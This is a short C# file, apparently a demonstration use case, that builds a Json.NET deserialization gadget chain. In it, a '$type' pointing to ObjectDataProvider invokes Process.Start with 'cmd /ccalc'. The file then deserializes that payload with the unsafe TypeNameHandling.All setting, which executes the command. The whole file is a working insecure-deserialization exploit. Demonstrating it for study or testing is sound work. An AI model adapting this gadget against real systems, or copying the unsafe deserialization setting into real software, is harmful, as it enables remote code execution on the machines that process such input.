using Newtonsoft.Json;

namespace mvcapp.UseCases
{
    public class UseCaseSeven
    {
        public static void Run()
        {
            string json = @"{
                '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
                'MethodName':'Start',
                'MethodParameters':{
                    '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    '$values':['cmd','/ccalc']
                },
                'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
            }";

            var deserializedTypedObject = JsonConvert.DeserializeObject(json,
                new JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.All
                });

            deserializedTypedObject.ToString();
        }
    }
}